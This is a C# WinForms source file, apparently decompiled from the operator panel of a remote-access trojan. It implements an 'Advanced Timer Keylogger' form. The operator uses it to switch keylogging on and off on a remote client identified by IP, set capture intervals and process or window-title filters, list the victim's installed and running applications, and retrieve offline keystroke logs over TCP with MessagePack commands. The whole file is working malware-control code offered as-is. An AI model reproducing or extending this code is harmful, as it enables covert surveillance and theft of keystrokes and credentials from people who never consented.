using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Utils.Svg;
using DevExpress.XtraEditors;
using DevExpress.XtraEditors.Controls;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Server.Connection;
using Server.Handle_Packet;

namespace Server.Forms;

public class FormTimerKeylog : XtraForm
{
	public Clients MainClient;

	private string procfilters = string.Empty;

	private IContainer components;

	private LabelControl labelControl4;

	private LabelControl labelControl2;

	private LabelControl labelControl1;

	private SpinEdit spinEditInterval;

	private TextEdit txtFilter;

	private SimpleButton btnStop;

	private SimpleButton btnStart;

	private System.Windows.Forms.Timer timerStatus;

	private XtraTabControl xtraTabControlLog;

	private XtraTabPage xtraTabPageLogVIew;

	private XtraTabPage xtraTabPageSetting;

	public RichTextBox richTextBoxLog;

	private SimpleButton btnApply;

	private ListBoxControl listBoxInstalledApp;

	private SimpleButton btnLoadOfflineLog;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	private XtraTabPage xtraTabPage2;

	private CheckedListBoxControl processList;

	private SimpleButton btnRefresh;

	private PanelControl panelControl1;

	private PanelControl panelControl2;

	private SeparatorControl separatorControl1;

	public FormTimerKeylog()
	{
		InitializeComponent();
	}

	public void LoadRunningApp(string procstr)
	{
		List<string> list = new List<string>(procstr.Split(new char[1] { ',' }, StringSplitOptions.RemoveEmptyEntries));
		processList.DataSource = list;
		MainClient.info.runningapps = list;
		MarkChecked();
	}

	public void MarkChecked()
	{
		processList.Update();
		int count = MainClient.info.runningapps.Count;
		for (int i = 0; i < count; i++)
		{
			string value = MainClient.info.runningapps[i].ToLower();
			if (MainClient.info.keyparam.filter.ToLower().Contains(value))
			{
				processList.SetItemChecked(i, value: true);
			}
		}
		processList.Update();
	}

	public void LoadInfos(string appsstr, string procstr)
	{
		List<string> list = new List<string>(procstr.Split(new char[1] { ',' }, StringSplitOptions.RemoveEmptyEntries));
		processList.DataSource = list;
		List<string> list2 = new List<string>(appsstr.Split(new char[1] { ';' }, StringSplitOptions.RemoveEmptyEntries));
		listBoxInstalledApp.DataSource = list2;
		MainClient.info.apps = list2;
		MainClient.info.runningapps = list;
		MarkChecked();
	}

	public void SendRunningAppMsg()
	{
		if (MainClient != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "runningapp";
			ThreadPool.QueueUserWorkItem(MainClient.Send, msgPack.Encode2Bytes());
		}
	}

	private void FormTimerKeylog_Load(object sender, EventArgs e)
	{
		if (MainClient == null)
		{
			Close();
		}
		listBoxInstalledApp.DataSource = MainClient.info.apps;
		spinEditInterval.Value = MainClient.info.keyparam.interval;
		txtFilter.Text = MainClient.info.keyparam.filter;
		Text = "Timer Keylog On " + MainClient.Ip;
		EnableKeylog(MainClient.info.keyparam.isEnabled);
		SendRunningAppMsg();
	}

	private void btnStart_Click(object sender, EventArgs e)
	{
		if (MainClient.TcpClient.Connected)
		{
			EnableKeylog(keyEnabled: true);
			MainClient.info.keyparam.isEnabled = true;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "keylogsetting";
			msgPack.ForcePathObject("value").AsString = MainClient.info.keyparam.content;
			ThreadPool.QueueUserWorkItem(MainClient.Send, msgPack.Encode2Bytes());
			new HandleLogs().Addmsg("Keylog is Enabled on " + MainClient.Ip, Color.Red);
		}
	}

	public void EnableKeylog(bool keyEnabled)
	{
		btnStart.Enabled = !keyEnabled;
		btnStop.Enabled = keyEnabled;
	}

	private void btnStop_Click(object sender, EventArgs e)
	{
		if (MainClient.TcpClient.Connected)
		{
			EnableKeylog(keyEnabled: false);
			MainClient.info.keyparam.isEnabled = false;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "keylogsetting";
			msgPack.ForcePathObject("value").AsString = MainClient.info.keyparam.content;
			ThreadPool.QueueUserWorkItem(MainClient.Send, msgPack.Encode2Bytes());
			new HandleLogs().Addmsg("Keylog is Disabled on " + MainClient.Ip, Color.Red);
		}
	}

	private void timerStatus_Tick(object sender, EventArgs e)
	{
	}

	private void FormTimerKeylog_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	public void AddLog(string log)
	{
		richTextBoxLog.Text += log;
		richTextBoxLog.SelectionStart = richTextBoxLog.Text.Length;
		richTextBoxLog.ScrollToCaret();
	}

	private void btnApply_Click(object sender, EventArgs e)
	{
		if (MainClient.TcpClient.Connected)
		{
			MainClient.info.keyparam.interval = (int)spinEditInterval.Value;
			MainClient.info.keyparam.filter = txtFilter.Text.Trim();
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "keylogsetting";
			msgPack.ForcePathObject("value").AsString = MainClient.info.keyparam.content;
			ThreadPool.QueueUserWorkItem(MainClient.Send, msgPack.Encode2Bytes());
			MessageBox.Show("Succcessfully changed!");
		}
	}

	private void btnLoadOfflineLog_Click(object sender, EventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "loadofflinelog";
		ThreadPool.QueueUserWorkItem(MainClient.Send, msgPack.Encode2Bytes());
	}

	private void processList_ItemCheck(object sender, DevExpress.XtraEditors.Controls.ItemCheckEventArgs e)
	{
		string filter = MainClient.info.keyparam.filter;
		string text = MainClient.info.runningapps[e.Index].ToLower();
		if (e.State == CheckState.Checked)
		{
			if (!filter.ToLower().Contains(text.ToLower()))
			{
				procfilters = procfilters + text + " ";
			}
		}
		else
		{
			procfilters = procfilters.Replace(text, string.Empty);
			MainClient.info.keyparam.filter = MainClient.info.keyparam.filter.Replace(text, string.Empty).Trim();
		}
		txtFilter.Text = MainClient.info.keyparam.filter + " " + procfilters.Trim();
	}

	private void btnRefresh_Click(object sender, EventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "filterinfo";
		ThreadPool.QueueUserWorkItem(MainClient.Send, msgPack.Encode2Bytes());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormTimerKeylog));
		this.labelControl4 = new DevExpress.XtraEditors.LabelControl();
		this.labelControl2 = new DevExpress.XtraEditors.LabelControl();
		this.labelControl1 = new DevExpress.XtraEditors.LabelControl();
		this.spinEditInterval = new DevExpress.XtraEditors.SpinEdit();
		this.txtFilter = new DevExpress.XtraEditors.TextEdit();
		this.btnStop = new DevExpress.XtraEditors.SimpleButton();
		this.btnStart = new DevExpress.XtraEditors.SimpleButton();
		this.timerStatus = new System.Windows.Forms.Timer(this.components);
		this.xtraTabControlLog = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPageLogVIew = new DevExpress.XtraTab.XtraTabPage();
		this.richTextBoxLog = new System.Windows.Forms.RichTextBox();
		this.panelControl1 = new DevExpress.XtraEditors.PanelControl();
		this.btnLoadOfflineLog = new DevExpress.XtraEditors.SimpleButton();
		this.xtraTabPageSetting = new DevExpress.XtraTab.XtraTabPage();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		this.listBoxInstalledApp = new DevExpress.XtraEditors.ListBoxControl();
		this.xtraTabPage2 = new DevExpress.XtraTab.XtraTabPage();
		this.processList = new DevExpress.XtraEditors.CheckedListBoxControl();
		this.panelControl2 = new DevExpress.XtraEditors.PanelControl();
		this.separatorControl1 = new DevExpress.XtraEditors.SeparatorControl();
		this.btnRefresh = new DevExpress.XtraEditors.SimpleButton();
		this.btnApply = new DevExpress.XtraEditors.SimpleButton();
		((System.ComponentModel.ISupportInitialize)this.spinEditInterval.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtFilter.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControlLog).BeginInit();
		this.xtraTabControlLog.SuspendLayout();
		this.xtraTabPageLogVIew.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).BeginInit();
		this.panelControl1.SuspendLayout();
		this.xtraTabPageSetting.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.listBoxInstalledApp).BeginInit();
		this.xtraTabPage2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.processList).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl2).BeginInit();
		this.panelControl2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.separatorControl1).BeginInit();
		base.SuspendLayout();
		this.labelControl4.Appearance.Font = new System.Drawing.Font("Tahoma", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.labelControl4.Appearance.Options.UseFont = true;
		this.labelControl4.Location = new System.Drawing.Point(208, 23);
		this.labelControl4.Name = "labelControl4";
		this.labelControl4.Size = new System.Drawing.Size(16, 16);
		this.labelControl4.TabIndex = 58;
		this.labelControl4.Text = "(s)";
		this.labelControl2.Appearance.Font = new System.Drawing.Font("Tahoma", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.labelControl2.Appearance.Options.UseFont = true;
		this.labelControl2.Location = new System.Drawing.Point(44, 74);
		this.labelControl2.Name = "labelControl2";
		this.labelControl2.Size = new System.Drawing.Size(253, 16);
		this.labelControl2.TabIndex = 55;
		this.labelControl2.Text = "Filter String (ProcessName or Window Title)";
		this.labelControl1.Appearance.Font = new System.Drawing.Font("Tahoma", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.labelControl1.Appearance.Options.UseFont = true;
		this.labelControl1.Location = new System.Drawing.Point(44, 23);
		this.labelControl1.Name = "labelControl1";
		this.labelControl1.Size = new System.Drawing.Size(52, 16);
		this.labelControl1.TabIndex = 54;
		this.labelControl1.Text = "Interval :";
		this.spinEditInterval.EditValue = new decimal(new int[4] { 5, 0, 0, 0 });
		this.spinEditInterval.Location = new System.Drawing.Point(102, 18);
		this.spinEditInterval.Name = "spinEditInterval";
		this.spinEditInterval.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.spinEditInterval.Size = new System.Drawing.Size(100, 28);
		this.spinEditInterval.TabIndex = 53;
		this.txtFilter.Location = new System.Drawing.Point(45, 95);
		this.txtFilter.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtFilter.Name = "txtFilter";
		this.txtFilter.Size = new System.Drawing.Size(729, 28);
		this.txtFilter.TabIndex = 52;
		this.btnStop.AppearanceDisabled.ForeColor = System.Drawing.Color.Gray;
		this.btnStop.AppearanceDisabled.Options.UseForeColor = true;
		this.btnStop.Dock = System.Windows.Forms.DockStyle.Left;
		this.btnStop.Enabled = false;
		this.btnStop.Location = new System.Drawing.Point(101, 2);
		this.btnStop.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnStop.Name = "btnStop";
		this.btnStop.Size = new System.Drawing.Size(99, 33);
		this.btnStop.TabIndex = 51;
		this.btnStop.Text = "Stop";
		this.btnStop.Click += new System.EventHandler(btnStop_Click);
		this.btnStart.AppearanceDisabled.ForeColor = System.Drawing.Color.Gray;
		this.btnStart.AppearanceDisabled.Options.UseForeColor = true;
		this.btnStart.Dock = System.Windows.Forms.DockStyle.Left;
		this.btnStart.Location = new System.Drawing.Point(2, 2);
		this.btnStart.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnStart.Name = "btnStart";
		this.btnStart.Size = new System.Drawing.Size(99, 33);
		this.btnStart.TabIndex = 50;
		this.btnStart.Text = "Start";
		this.btnStart.Click += new System.EventHandler(btnStart_Click);
		this.timerStatus.Interval = 1000;
		this.timerStatus.Tick += new System.EventHandler(timerStatus_Tick);
		this.xtraTabControlLog.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControlLog.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControlLog.Name = "xtraTabControlLog";
		this.xtraTabControlLog.SelectedTabPage = this.xtraTabPageLogVIew;
		this.xtraTabControlLog.Size = new System.Drawing.Size(819, 533);
		this.xtraTabControlLog.TabIndex = 61;
		this.xtraTabControlLog.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[2] { this.xtraTabPageLogVIew, this.xtraTabPageSetting });
		this.xtraTabPageLogVIew.Controls.Add(this.richTextBoxLog);
		this.xtraTabPageLogVIew.Controls.Add(this.panelControl1);
		this.xtraTabPageLogVIew.Name = "xtraTabPageLogVIew";
		this.xtraTabPageLogVIew.Size = new System.Drawing.Size(817, 502);
		this.xtraTabPageLogVIew.Text = "Logs";
		this.richTextBoxLog.BackColor = System.Drawing.Color.FromArgb(36, 36, 36);
		this.richTextBoxLog.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBoxLog.Dock = System.Windows.Forms.DockStyle.Fill;
		this.richTextBoxLog.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.richTextBoxLog.ForeColor = System.Drawing.Color.Gainsboro;
		this.richTextBoxLog.Location = new System.Drawing.Point(0, 37);
		this.richTextBoxLog.Margin = new System.Windows.Forms.Padding(2);
		this.richTextBoxLog.Name = "richTextBoxLog";
		this.richTextBoxLog.ReadOnly = true;
		this.richTextBoxLog.Size = new System.Drawing.Size(817, 465);
		this.richTextBoxLog.TabIndex = 52;
		this.richTextBoxLog.Text = "";
		this.panelControl1.Controls.Add(this.btnLoadOfflineLog);
		this.panelControl1.Controls.Add(this.btnStop);
		this.panelControl1.Controls.Add(this.btnStart);
		this.panelControl1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panelControl1.Location = new System.Drawing.Point(0, 0);
		this.panelControl1.Name = "panelControl1";
		this.panelControl1.Size = new System.Drawing.Size(817, 37);
		this.panelControl1.TabIndex = 54;
		this.btnLoadOfflineLog.AppearanceDisabled.ForeColor = System.Drawing.Color.Gray;
		this.btnLoadOfflineLog.AppearanceDisabled.Options.UseForeColor = true;
		this.btnLoadOfflineLog.Dock = System.Windows.Forms.DockStyle.Right;
		this.btnLoadOfflineLog.Location = new System.Drawing.Point(679, 2);
		this.btnLoadOfflineLog.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnLoadOfflineLog.Name = "btnLoadOfflineLog";
		this.btnLoadOfflineLog.Size = new System.Drawing.Size(136, 33);
		this.btnLoadOfflineLog.TabIndex = 53;
		this.btnLoadOfflineLog.Text = "Load OfflineKeylog";
		this.btnLoadOfflineLog.Click += new System.EventHandler(btnLoadOfflineLog_Click);
		this.xtraTabPageSetting.Controls.Add(this.xtraTabControl1);
		this.xtraTabPageSetting.Controls.Add(this.panelControl2);
		this.xtraTabPageSetting.Name = "xtraTabPageSetting";
		this.xtraTabPageSetting.Size = new System.Drawing.Size(817, 502);
		this.xtraTabPageSetting.Text = "Setting";
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 141);
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(817, 361);
		this.xtraTabControl1.TabIndex = 64;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[2] { this.xtraTabPage1, this.xtraTabPage2 });
		this.xtraTabPage1.Controls.Add(this.listBoxInstalledApp);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(815, 330);
		this.xtraTabPage1.Text = "Installed Applications";
		this.listBoxInstalledApp.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listBoxInstalledApp.Location = new System.Drawing.Point(0, 0);
		this.listBoxInstalledApp.Name = "listBoxInstalledApp";
		this.listBoxInstalledApp.Size = new System.Drawing.Size(815, 330);
		this.listBoxInstalledApp.TabIndex = 62;
		this.xtraTabPage2.Controls.Add(this.processList);
		this.xtraTabPage2.Name = "xtraTabPage2";
		this.xtraTabPage2.Size = new System.Drawing.Size(815, 330);
		this.xtraTabPage2.Text = "Processes Status ";
		this.processList.Dock = System.Windows.Forms.DockStyle.Fill;
		this.processList.Location = new System.Drawing.Point(0, 0);
		this.processList.Name = "processList";
		this.processList.Size = new System.Drawing.Size(815, 330);
		this.processList.TabIndex = 0;
		this.processList.ItemCheck += new DevExpress.XtraEditors.Controls.ItemCheckEventHandler(processList_ItemCheck);
		this.panelControl2.Controls.Add(this.separatorControl1);
		this.panelControl2.Controls.Add(this.labelControl1);
		this.panelControl2.Controls.Add(this.btnRefresh);
		this.panelControl2.Controls.Add(this.labelControl2);
		this.panelControl2.Controls.Add(this.spinEditInterval);
		this.panelControl2.Controls.Add(this.btnApply);
		this.panelControl2.Controls.Add(this.txtFilter);
		this.panelControl2.Controls.Add(this.labelControl4);
		this.panelControl2.Dock = System.Windows.Forms.DockStyle.Top;
		this.panelControl2.Location = new System.Drawing.Point(0, 0);
		this.panelControl2.Name = "panelControl2";
		this.panelControl2.Size = new System.Drawing.Size(817, 141);
		this.panelControl2.TabIndex = 66;
		this.separatorControl1.Anchor = System.Windows.Forms.AnchorStyles.None;
		this.separatorControl1.LineColor = System.Drawing.Color.FromArgb(1, 163, 1);
		this.separatorControl1.Location = new System.Drawing.Point(2, 54);
		this.separatorControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.separatorControl1.Name = "separatorControl1";
		this.separatorControl1.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.separatorControl1.Size = new System.Drawing.Size(810, 15);
		this.separatorControl1.TabIndex = 179;
		this.btnRefresh.AppearanceDisabled.ForeColor = System.Drawing.Color.Gray;
		this.btnRefresh.AppearanceDisabled.Options.UseForeColor = true;
		this.btnRefresh.Location = new System.Drawing.Point(586, 16);
		this.btnRefresh.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnRefresh.Name = "btnRefresh";
		this.btnRefresh.Size = new System.Drawing.Size(188, 32);
		this.btnRefresh.TabIndex = 65;
		this.btnRefresh.Text = "Refresh Informations";
		this.btnRefresh.Click += new System.EventHandler(btnRefresh_Click);
		this.btnApply.Location = new System.Drawing.Point(267, 16);
		this.btnApply.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnApply.Name = "btnApply";
		this.btnApply.Size = new System.Drawing.Size(188, 32);
		this.btnApply.TabIndex = 61;
		this.btnApply.Text = "Apply";
		this.btnApply.Click += new System.EventHandler(btnApply_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(819, 533);
		base.Controls.Add(this.xtraTabControlLog);
		this.Cursor = System.Windows.Forms.Cursors.Default;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
		base.IconOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("FormTimerKeylog.IconOptions.SvgImage");
		base.Name = "FormTimerKeylog";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Advanced Timer Keylogger for Applications";
		base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FormTimerKeylog_FormClosing);
		base.Load += new System.EventHandler(FormTimerKeylog_Load);
		((System.ComponentModel.ISupportInitialize)this.spinEditInterval.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtFilter.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControlLog).EndInit();
		this.xtraTabControlLog.ResumeLayout(false);
		this.xtraTabPageLogVIew.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.panelControl1).EndInit();
		this.panelControl1.ResumeLayout(false);
		this.xtraTabPageSetting.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.listBoxInstalledApp).EndInit();
		this.xtraTabPage2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.processList).EndInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl2).EndInit();
		this.panelControl2.ResumeLayout(false);
		this.panelControl2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.separatorControl1).EndInit();
		base.ResumeLayout(false);
	}
}
